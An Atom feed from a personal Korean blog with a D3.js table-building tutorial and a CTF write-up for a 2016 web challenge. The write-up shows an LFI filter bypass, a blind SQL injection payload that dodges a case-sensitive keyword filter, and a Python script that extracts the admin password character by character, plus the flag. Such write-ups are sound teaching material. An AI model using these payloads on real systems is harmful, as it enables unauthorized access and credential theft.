<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>G40N</title>
 <link href="https://blog.gaonnr.me/atom.xml" rel="self"/>
 <link href="https://blog.gaonnr.me/"/>
 <updated>2017-02-15T16:40:59+09:00</updated>
 <id>https://blog.gaonnr.me</id>
 <author>
   <name>Junseop Ji</name>
   <email>gaon0403@gmail.com</email>
 </author>

 
 <entry>
   <title>D3를 통한 차트 제작 스터디</title>
   <link href="https://blog.gaonnr.me/development/2017/02/15/d3-study/"/>
   <updated>2017-02-15T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/development/2017/02/15/d3-study</id>
   <content type="html">&lt;p&gt;&lt;img src=&quot;/images/D3/d3_logo.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;a href=&quot;https://d3js.org&quot;&gt;D3&lt;/a&gt;는 기본적으로 array형태로 묶인 데이터를 각각의 요소에 바인딩하고, 바인딩된 데이터를 통해 각 요소에 작업을 수행하는 라이브러리이다. 따라서, D3으로 차트를 만드는 모든 과정은 다음과 같은 과정을 거친다:&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;데이터를 바인딩할 element 선택 -&amp;gt; 데이터 바인딩 -&amp;gt; element가 대응되지 않는 데이터들에 진입 -&amp;gt; 데이터에 기반한 요소 추가 작업&lt;/code&gt;&lt;br /&gt;
여기서, 처음 차트를 생성할 때는 첫 단계에서 선택되는 데이터는 아무것도 없는 경우가 많다. 즉, 아무것도 없는(이제 element가 추가될) 빈 공간을 D3 selector를 통해 선택하고, 데이터를 바인딩한 후, 데이터 array 안에 존재하는 각각의 값을 이용하여 원하는 속성을 가지는 element를 하나하나 추가하는 방식으로 차트를 제작하는 방식이 보편적이라 할 수 있다.&lt;/p&gt;

&lt;p&gt;예를 들어, 다음과 같은 표를 제작하려 한다고 하자.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;size(GB)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;C:&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;128&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;D:&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;512&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;E:&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;16&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;F:&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;8&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;G:&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;8&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;먼저, 이 표를 구성하는 데이터를 입력받아야 한다. D3는 csv등의 다양한 포맷을 지원하지만, 결국 중요한 것은 최종적으로 Array 형태의 데이터를 만드는 것이다.&lt;br /&gt;
데이터가 csv파일이라면, 다음과 같이 구성되어 있을 것이다:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;javascript
&quot;name&quot;,&quot;size(GB)&quot;
&quot;C:&quot;,128
&quot;D:&quot;,512
&quot;E:&quot;,16
&quot;F:&quot;,8
&quot;G:&quot;,8
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;이를 받아서 Array의 형태의 data를 생성하는 코드는 다음과 같다:&lt;/p&gt;

&lt;p&gt;```javascript
d3.csv(‘data.csv’, function(error, data) {
  data.forEach(function (d, i) {
    d.name = d.name; // meaningless code
    d.size = +d.size;
  });&lt;/p&gt;

&lt;p&gt;// callback function
  draw(data);
});
```&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;d3.csv()&lt;/code&gt;함수는 첫 번째 argument의 string을 path로서 사용하여 해당 경로의 csv파일을 읽어들인 후 array로 변환하고, 이를 두 번재 argument로 설정된 함수에 data로서 넘긴다. 즉, 경로만 맞게 입력된다면 &lt;code class=&quot;highlighter-rouge&quot;&gt;d3.csv()&lt;/code&gt;함수를 실행시키는 것만으로도 다음과 같은, Object들의 Array가 완성된다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;javascript
[{
  &#39;name&#39;: &#39;C:&#39;,
  &#39;size&#39;: &#39;128&#39;
},
{
  &#39;name&#39;: &#39;D:&#39;,
  &#39;size&#39;: &#39;512&#39;
},
/* ... */
]
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;이것만으로도 표를 구성하는 데에는 문제가 없지만, 만약 받아들인 데이터에 추가적인 작업을 하고 싶다면(예를 들어, size를 MB로 변환하고 싶다던가), forEach 함수를 활용하여 데이터를 수정할 수 있다. 위 코드에서는, &lt;code class=&quot;highlighter-rouge&quot;&gt;d.size = +d.size&lt;/code&gt;라는 코드를 통해 문자열로 받아들여지는 size값을 숫자로 바꾸었다. (forEach에 argument로 반드시 d, i를 적을 필요는 없지만, D3의 Example 코드들을 보면, 많은 코드들이 암묵적으로 익명함수에 전달되는 argument를 d, i로 설정한다)&lt;/p&gt;

&lt;p&gt;데이터를 로드하는 과정은 비동기적으로 이루어지기 때문에, &lt;code class=&quot;highlighter-rouge&quot;&gt;d3.csv()&lt;/code&gt; 뒤에 있는 코드라인들은 데이터가 다 로드되지 않아도 계속해서 실행된다. 따라서, 데이터가 다 로드된 다음 테이블을 그릴 수 있도록 하려면, 함수의 인자로 전달된 익명함수의 끝에 콜백 함수를 지정해 주어야 한다. 여기서는 &lt;code class=&quot;highlighter-rouge&quot;&gt;draw()&lt;/code&gt;함수가 바깥에 선언되어 있다고 가정하고, 그 함수를 호출하여 표를 그릴 수 있도록 하였다.&lt;/p&gt;

&lt;p&gt;이제 표를 그리는 draw()함수를 살펴보면, 다음과 같은 구조를 띄고 있을 것이다.&lt;/p&gt;

&lt;p&gt;```javascript
columns = [‘name’, ‘size’];&lt;/p&gt;

&lt;p&gt;function draw(data) {
  var table = d3.select(‘#div-for-table’)
    .append(‘table’)
    .attr(‘class’, ‘table’);&lt;/p&gt;

&lt;p&gt;var thead = table.append(‘thead’)
    .attr(‘class’, ‘thead’)
    .append(‘tr’)
    .selectAll(‘th’)
    .data(columns)
    .enter()
    .append(‘th’)
    .text(function(col) {
      return col;
    });&lt;/p&gt;

&lt;p&gt;var tbody = table.append(‘tbody’)
    .selectAll(‘tr’)
    .data(data)
    .enter()
    .append(‘tr’);&lt;/p&gt;

&lt;p&gt;var cells = tbody.selectAll(‘td’)
    .data(function (row, i) {
      return columns.map(function (col) {
        return row[col];
      });
    })
    .enter()
    .append(‘td’)
    .text(function(d) {
      return d;
    });
}
```&lt;/p&gt;

&lt;p&gt;처음의 &lt;code class=&quot;highlighter-rouge&quot;&gt;table&lt;/code&gt;변수를 선언하면서 이루어지는 작업은 다음과 같다. 먼저, d3 selector로 table이 들어가게 될 공간을 선택한다. (d3 selector는 jquery와 기능이 거의 유사하다) 그 후, 그 자식 element로 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;table&amp;gt;&lt;/code&gt;을 추가하고, &lt;code class=&quot;highlighter-rouge&quot;&gt;&#39;table&#39;&lt;/code&gt;이라는 class를 부여한다. 이 모든 과정은 코드에서 보이는 바와 같이 함수형 프로그래밍과 유사하게 짜여질 수 있다.&lt;/p&gt;

&lt;p&gt;다음의 &lt;code class=&quot;highlighter-rouge&quot;&gt;thead&lt;/code&gt;는 선언되면서 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;table&amp;gt;&lt;/code&gt;에 &lt;code class=&quot;highlighter-rouge&quot;&gt;th&lt;/code&gt;들을 추가한다. 먼저 위에서 선언된 &lt;code class=&quot;highlighter-rouge&quot;&gt;table&lt;/code&gt; variable 안에 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;thead&amp;gt;&lt;/code&gt; element를 추가하고 &lt;code class=&quot;highlighter-rouge&quot;&gt;&#39;thead&#39;&lt;/code&gt; class를 부여한다. 거기에 다시 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;tr&amp;gt;&lt;/code&gt; element를 추가하고, 그 안에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;selectAll()&lt;/code&gt;함수로 모든 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;th&amp;gt;&lt;/code&gt; element를 선택한다. 이 때, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;tr&amp;gt;&lt;/code&gt;안에는 아직 어떤 element도 들어가 있지 않으므로, 아무것도 선택되지 않게 되는데, 이 다음부터가 차트를 만드는 과저의 핵심이다. 이 선택된 element들에게 &lt;code class=&quot;highlighter-rouge&quot;&gt;data()&lt;/code&gt;함수로 data array를 1:1로 바인딩한다. 그런데 &lt;code class=&quot;highlighter-rouge&quot;&gt;selectAll()&lt;/code&gt;함수로는 아무것도 선택되지 않은 상태이기 때문에, 데이터의 전부가 매칭되지 않고 남게 된다. 바로 이 때, &lt;code class=&quot;highlighter-rouge&quot;&gt;enter()&lt;/code&gt;함수가 사용된다.&lt;/p&gt;

&lt;p&gt;이 함수는 &lt;strong&gt;매칭(바인딩)되지 않은 데이터에 하나하나씩 접근해, 그 데이터에 대해 동작을 수행할 수 있게 한다.&lt;/strong&gt; 바인딩되지 않은 데이터들에 대한 &lt;code class=&quot;highlighter-rouge&quot;&gt;forEach()&lt;/code&gt; 함수라고 보면 되겠다.&lt;/p&gt;

&lt;p&gt;이제 &lt;code class=&quot;highlighter-rouge&quot;&gt;enter()&lt;/code&gt;함수를 통해 각각의 데이터들에 진입한 상태인데, 뒤에 &lt;code class=&quot;highlighter-rouge&quot;&gt;.append(&#39;th&#39;).text(...)&lt;/code&gt; 코드가 있으므로 각각의 데이터에 대해 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;th&amp;gt;&lt;/code&gt; element가 추가된다. 즉, &lt;code class=&quot;highlighter-rouge&quot;&gt;columns&lt;/code&gt;에 들어 있는 원소의 개수(2개)만큼의 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;th&amp;gt;&lt;/code&gt;가 추가된다. enter함수는 뒤에 오는 함수들에게 인자로 지금의 데이터와 인덱스를 넘겨줄 수 있는데, 이 코드에서는 &lt;code class=&quot;highlighter-rouge&quot;&gt;text()&lt;/code&gt; 함수 내부의 익명 함수가 &lt;code class=&quot;highlighter-rouge&quot;&gt;col&lt;/code&gt;으로 데이터(문자열 ‘name’과 ‘size’)를 받아 그 값을 반환한다. 최종적으로, 각각 &lt;code class=&quot;highlighter-rouge&quot;&gt;&#39;name&#39;&lt;/code&gt;과 &lt;code class=&quot;highlighter-rouge&quot;&gt;&#39;size&#39;&lt;/code&gt;라는 문자열을 표시하는 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;th&amp;gt;&lt;/code&gt; element가 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;tr&amp;gt;&lt;/code&gt; 내부에 추가된다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tbody&lt;/code&gt;도 위와 비슷한 역할을 하는데, 다른 점이 있다면 바인딩하는 데이터가 csv파일에서 직접 뽑아낸 데이터라는 것과, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;thead&amp;gt;&amp;lt;tr&amp;gt;&lt;/code&gt;에 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;th&amp;gt;&lt;/code&gt;를 추가하는 대신 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;tbody&amp;gt;&lt;/code&gt; 안에 data의 길이와 같은 개수의 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;tr&amp;gt;&lt;/code&gt;을 추가한다는 것이다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cells&lt;/code&gt;의 경우, 위에서 선언된 tbody 안에 진입하여 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;td&amp;gt;&lt;/code&gt;원소를 추가한다. 이때, 바인딩하는 데이터는 이미 각각의 row에 바인딩된 데이터를 기반으로 주어지는데, 만약 어떤 row에 바인딩된 데이터가 &lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&#39;name&#39;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&#39;C:&#39;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&#39;size&#39;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;이라면, 익명 함수에 의해 반환되는 데이터는 &lt;code class=&quot;highlighter-rouge&quot;&gt;[&#39;C:&#39;, 128]&lt;/code&gt;로서, 이 데이터를 토대로 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;td&amp;gt;&lt;/code&gt;, 즉 table 각각의 row 내부의 cell이 추가된다.&lt;/p&gt;

&lt;p&gt;모든 작업이 끝나면 다음과 같은 html코드가 생성되며, 이는 우리가 만들려 한 표와 같은 구조를 이룰 것이다. 적당한 css파일을 갖고 있다면, 표의 각 원소에 적절한 class나 style을 줌으로써 표의 외양을 바꿀 수도 있다.&lt;/p&gt;

&lt;p&gt;```html&lt;/p&gt;
&lt;table class=&quot;table&quot;&gt;
  &lt;thead class=&quot;thead&quot;&gt;
    &lt;tr&gt;
      &lt;th&gt;name&lt;/th&gt;
      &lt;th&gt;size(GB)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;C:&lt;/td&gt;
      &lt;td&gt;128&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;D:&lt;/td&gt;
      &lt;td&gt;512&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;E:&lt;/td&gt;
      &lt;td&gt;16&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;F:&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;G:&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;```&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>2016 Kaist - Postech Science War Writeup (wargame_easy | Web 200pt)</title>
   <link href="https://blog.gaonnr.me/hacking/2016/09/24/kapo-writeup/"/>
   <updated>2016-09-24T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/hacking/2016/09/24/kapo-writeup</id>
   <content type="html">&lt;p&gt;처음으로 쓰는 Writeup이다!&lt;/p&gt;

&lt;p&gt;Web계열의 200점(확실하지 않음)짜리 문제인 &lt;a href=&quot;http://chall.pwn-with.me&quot;&gt;wargame_easy&lt;/a&gt;이다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_09/kapo16/main1.png&quot; style=&quot;width: 640px;&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;링크를 타고 들어가면, 환영 문구와 함께 ‘Login’ ‘Register’ 두 개의 메뉴가 보인다.&lt;br /&gt;
Register 메뉴를 통해 사이트에 가입한 후 로그인하면 다음과 같은 화면이 나온다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;img src=&quot;/images/2016_09/kapo16/main2.png&quot; style=&quot;width: 640px;&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Prob, Auth, Rank 등의 메뉴로 미루어 보건데 CTF사이트를 모티브로 만들어진 사이트이다.&lt;br /&gt;
실제로 Prob에 적혀있는 키를 Auth에 넣어 보니 점수가 올라가 Rank에 반영되는 것을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;rank 메뉴에 진입했을 때의 URL이 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://chall.pwn-with.me/?page=rank&lt;/code&gt;이므로, LFI 취약점이 존재할 것으로 생각된다.&lt;br /&gt;
이를 이용해서 php filer로 base64 인코딩된 소스를 얻으려 했으나, 소스 보기를 했을 경우 detected라는 문구밖에 보이지 않는다. page 뒤의 argument에 특정 단어가 삽임되었을 경우 이를 필터랑하고 detected를 출력하도록 프로그램되었을 것을 예상할 수 있다.&lt;/p&gt;

&lt;p&gt;다른 php filter를 이용한 시도 결과, &lt;code class=&quot;highlighter-rouge&quot;&gt;php://filter/read=string.rot13/resource=&lt;/code&gt;가 filtering에 걸리지 않음을 확인할 수 있었고, 이를 통해 login, register, rank, info 페이지의 소스를 13칸 밀린 caesar cipher의 형태로 알아낼 수 있었다.&lt;br /&gt;
이를 복호화한 결과는 다음과 같다. (당시 toUpper 함수를 사용하여, 모든 소스가 대문자로 이루어져 있다)&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
  &lt;a href=&quot;https://github.com/GAONNR/Kapo2016/blob/master/plainIndex.php&quot;&gt;index.php&lt;/a&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;
  &lt;a href=&quot;https://github.com/GAONNR/Kapo2016/blob/master/plainLogin.php&quot;&gt;login.php&lt;/a&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;
  &lt;a href=&quot;https://github.com/GAONNR/Kapo2016/blob/master/plainInfo.php&quot;&gt;info.php&lt;/a&gt;
&lt;/p&gt;

&lt;p&gt;먼저 주목해야 할 것은 info페이지의 19 ~ 35번 라인이다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;php
&amp;lt;?PHP
  IF($_POST){
    IF($_SESSION[ID] == &#39;ADMIN&#39;) EXIT();
    IF($_POST[PW] == &quot;&quot;){
      ECHO &quot;&amp;lt;SCRIPT&amp;gt;ALERT(&#39;INPUT YOUR PASSWORD.&#39;);HISTORY.GO(-1);&amp;lt;/SCRIPT&amp;gt;&quot;;
      EXIT();
    }
    IF(STRLEN($_POST[PW]) &amp;gt; 32){
      ECHO &quot;&amp;lt;SCRIPT&amp;gt;ALERT(&#39;CAN&#39;T CREATE PASSWORD BIGGER THAN 32 BYTES.&#39;);HISTORY.GO(-1);&amp;lt;/SCRIPT&amp;gt;&quot;;
      EXIT();
    }
    $_POST[PW] = ADDSLASHES($_POST[PW]);
    $SQL = &quot;UPDATE MEMBER SET PW = &#39;$_POST[PW]&#39; WHERE ID = &#39;$_SESSION[ID]&#39;&quot;;
    $Q = @MYSQL_QUERY($SQL);
    ECHO &quot;&amp;lt;SCRIPT&amp;gt;ALERT(&#39;PW CHANGED.&#39;);LOCATION.HREF=&#39;?PAGE=INFO&#39;;&amp;lt;/SCRIPT&amp;gt;&quot;;
  }
?&amp;gt;
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;info 페이지는 사용자의 비멀번호를 변경할 수 있는 페이지인데, 세 번째 줄의 &lt;code class=&quot;highlighter-rouge&quot;&gt;IF($_SESSION[ID] == &#39;ADMIN&#39;) EXIT();&lt;/code&gt;에 의해 서버에 admin이 등록되어 있으며, admin 계정의 비밀번호 변경을 막고 있음을 알 수 있다. 따라서 admin계정의 비밀번호를 알아내는 것을 목표로 정하고 다음 과정을 진행하였다.&lt;/p&gt;

&lt;p&gt;다음으로 login 페이지의 12 ~ 35번 라인에서 공격 방식에 대한 힌트를 찾을 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;php
&amp;lt;?PHP
	IF($_POST){
		IF($_SESSION[ID]){
			ECHO &quot;&amp;lt;SCRIPT&amp;gt;ALERT(&#39;YOU HAVE ALREADY LOGGED IN.&#39;);HISTORY.GO(-1);&amp;lt;/SCRIPT&amp;gt;&quot;;
			EXIT();
		}
		$SQL = &quot;SELECT * FROM MEMBER WHERE ID = &#39;&quot;.TRIM($_POST[ID]).&quot;&#39;&quot;;
		$RESULT = @MYSQL_QUERY($SQL);
		$DATA = @MYSQL_FETCH_ARRAY($RESULT);
		IF($DATA[ID]){
			IF($_POST[PW] == $DATA[PW]){
				$_SESSION[ID] = $DATA[ID];
				ECHO &quot;&amp;lt;SCRIPT&amp;gt;ALERT(&#39;HELLO $_SESSION[ID]&#39;);LOCATION.HREF=&#39;./&#39;;&amp;lt;/SCRIPT&amp;gt;&quot;;
			}ELSE{
				ECHO &quot;&amp;lt;SCRIPT&amp;gt;HISTORY.GO(-1);&amp;lt;/SCRIPT&amp;gt;&quot;;
				EXIT();
			}
		}ELSE{
			ECHO &quot;&amp;lt;SCRIPT&amp;gt;HISTORY.GO(-1);&amp;lt;/SCRIPT&amp;gt;&quot;;
			EXIT();
		}
	}
?&amp;gt;
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;공격 방식으로 SQL Injection이 유효함을 (매우 쉽게) 알 수 있다.&lt;/p&gt;

&lt;p&gt;이제 index 페이지의 75 ~ 80번 라인을 보면,&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;php
&amp;lt;?PHP
	IF(PREG_MATCH(&quot;/CONVERT|BASE64|DATA|UNION|SELECT|FROM|WHERE|SLEEP|BENCH|JOIN|CHAR|INFOR|SCHEMA|COLUMNS|LIKE|#|\)|\(|&amp;gt;|&amp;lt;|,|\*|!|\.\./&quot;,IMPLODE($_GET))) EXIT(&quot;DETECTED&quot;);
	IF(PREG_MATCH(&quot;/CONVERT|BASE64|DATA|UNION|SELECT|FROM|WHERE|SLEEP|BENCH|JOIN|CHAR|INFOR|SCHEMA|COLUMNS|LIKE|#|\)|\(|&amp;gt;|&amp;lt;|,|\*|!|\.\./&quot;,IMPLODE($_POST))) EXIT(&quot;DETECTED&quot;);
	IF(ISSET($_GET[PAGE])){
		INCLUDE($_GET[PAGE].&quot;.PHP&quot;);
	}ELSE{
?&amp;gt;
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;base64, select 등의 많은 구문을 입력에서 걸러내고 있음을 알 수 있다. 처음 LFI를 시도할 때, base64 filter가 detected된 것도 이 코드에 의해서임을 파악할 수 있었다.&lt;/p&gt;

&lt;p&gt;처음에는 Time-based Blind SQL Injecton으로 공격을 시도하려 했으나, &lt;code class=&quot;highlighter-rouge&quot;&gt;sleep&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;bench&lt;/code&gt;등의 중요한 함수들이 필터링되고, 결정적으로 괄호 &lt;code class=&quot;highlighter-rouge&quot;&gt;(&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;)&lt;/code&gt;들이 필터링되어 불가능하다고 판단되었다.  괄호가 막혔기 때문에 목록에 없는 함수를 사용하는 것도 거의 불가능했다.&lt;/p&gt;

&lt;p&gt;그러나 곧 위 코드의 치명적인 취약점을 찾아낼 수 있었는데, 그것은 &lt;code class=&quot;highlighter-rouge&quot;&gt;preg_match&lt;/code&gt;함수의 첫 번째 argument string 뒤에 &lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt;가 붙지 않았다는 것이었다. 이는 preg_match에서 대소문자를 구별하여 받아들인다는 것을 뜻하고, SQL은 구문의 대소문자를 구별하지 않으므로, 이를 이용하여 필터링을 아주 간단하게 우회할 수 있었다. 예를 들어 &lt;code class=&quot;highlighter-rouge&quot;&gt;like&lt;/code&gt;를 SQL 구문에 포함시키고 싶다면, &lt;code class=&quot;highlighter-rouge&quot;&gt;like&lt;/code&gt; 대신 &lt;code class=&quot;highlighter-rouge&quot;&gt;LikE&lt;/code&gt;라고 쓰면 필터링을 우회하여 서버에 그대로 구문을 보낼 수 있게 된다.&lt;/p&gt;

&lt;p&gt;이에 착안하여 다음과 같은 payload를 만들 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fqwrlqwrhqwklhflqfi123123&#39; or CASE WHEN id=&#39;admin&#39; AND pw LikE &#39;a%&#39; THEN TRUE ELSE FALSE END or id=&#39;godj3&#39; order by id asc -- a&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;이를 login의 id에 넣으면 다음과 같은 SQL Query가 완성된다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sql
SELECT * FROM MEMBER WHERE ID = &#39;fqwrlqwrhqwklhflqfi123123&#39; or CASE WHEN id=&#39;admin&#39; AND pw LikE &#39;a%&#39; THEN TRUE ELSE FALSE END or id=&#39;godj3&#39; order by id asc -- a
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;괄호가 필터링됨으로 인해 if, substr등의 함수를 사용할 수 없었으므로, 그 대신에 case when과 like를 활용하여 비슷한 역할을 하는 구문을 만들 수 있었다.&lt;/p&gt;

&lt;p&gt;ID로 들어가는 &lt;code class=&quot;highlighter-rouge&quot;&gt;fqwrlqwrhqwklhflqfi123123&lt;/code&gt;은 서버에 등록되어 있지 않은 id이므로, 언제나 거짓을 반환한다. 그 후 &lt;code class=&quot;highlighter-rouge&quot;&gt;CASE WHEN id=&#39;admin&#39; AND pw LikE &#39;a%&#39; THEN TRUE ELSE FALSE END&lt;/code&gt;를 만나게 되는데, 만약 admin의 pw가 a로 시작한다면 TRUE를, 아니라면 FALSE를 반환한다. 만약 FALSE라면, 뒤의 구문에 의해 &lt;code class=&quot;highlighter-rouge&quot;&gt;godj3&lt;/code&gt;을 id로서 불러오게 되고, pw부분에 미리 만들어 둔 godj3 계정의 비밀번호를 입력해 두면 godj3계정으로 로그인된다. 만약 admin의 pw가 a로 시작한다면, 미리 입력해 둔 godj3 계정의 비밀번호와 admin의 비밀번호는 맞지 않을 것이므로 로그인에 실패하게 된다. 이를 이용하여 admin의 password를 알아내는 프로그램을 짤 수 있다.&lt;/p&gt;

&lt;p align=&quot;CENTER&quot;&gt;
	&lt;a href=&quot;https://github.com/GAONNR/Kapo2016/blob/master/login.py&quot;&gt;login.py&lt;/a&gt;
&lt;/p&gt;

&lt;p&gt;```python
import requests
import string&lt;/p&gt;

&lt;p&gt;baseurl = ‘http://chall.pwn-with.me/?page=login’&lt;/p&gt;

&lt;p&gt;def postData(id, pw):
    params = {‘id’: id, ‘pw’: pw}
    res = requests.post(baseurl, data = params)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#print res.text
if res.text.find(&#39;Hello&#39;) &amp;gt; 0:
    return True
else:
    return False
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;print-postdatafqwrlqwrhqwklhflqf-or-ifidadmin-and-0-1-0-or-nameguest-order-by-name-asc----a-guest&quot;&gt;print postData(‘&#39;’fqwrlqwrhqwklhflqf’ or if(id=’admin’ and 0, 1, 0) or name=’guest’ order by name asc – a’’’, ‘guest’)&lt;/h1&gt;

&lt;p&gt;print postData(“fqwrlqwrhqwklhflqfi123123’ or CASE WHEN id=’admin’ AND FALSE THEN TRUE ELSE FALSE END or id=’godj3’ order by id asc – a”, ‘godj3’)&lt;/p&gt;

&lt;p&gt;print postData(‘godj3’, ‘godj3’)&lt;/p&gt;

&lt;p&gt;print postData(“sadawqoeqweqnnncxma’ or id=’godj3’ – a”, ‘godj3’)&lt;/p&gt;

&lt;p&gt;payload = “fqwrlqwrhqwklhflqfi123123’ or CASE WHEN id=’admin’ AND pw LikE ‘”&lt;/p&gt;

&lt;p&gt;payend = “%’ THEN TRUE ELSE FALSE END or id=’godj3’ order by id asc – a”&lt;/p&gt;

&lt;p&gt;key = ‘’&lt;/p&gt;

&lt;p&gt;for k in range(100):
    check = False
    for i in string.printable:
        if i == ‘_’ or i == ‘!’ or i == ‘#’ or i == ‘%’ or i == ‘&#39;’ or i == ‘&quot;’ or i == ‘(‘ or i == ‘)’ or i == ‘*’ or i == ‘+’ or i == ‘-‘ or i == ‘&amp;amp;’ or i == ‘|’ or i == ‘&amp;gt;’ or i == ‘&amp;lt;’ or i == ‘=’ or i == ‘?’ or i == ‘~’ or i == ‘,’:
            continue
        # print key + i,
        # print postData(payload + i + payend, ‘godj3’)
        if not postData(payload + key + i + payend, ‘godj3’):
            print key + i
            key = key + i
            check = True
            break&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if check == False:
    key += &#39;_&#39; ```
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;kapo{j.s.bach_french_suites}&lt;/code&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>자기소개서 글자 수 (Byte수) 카운팅 프로그램</title>
   <link href="https://blog.gaonnr.me/development/2016/09/13/jagisogae/"/>
   <updated>2016-09-13T00:00:00+09:00</updated>
   <id>https://blog.gaonnr.me/development/2016/09/13/jagisogae</id>
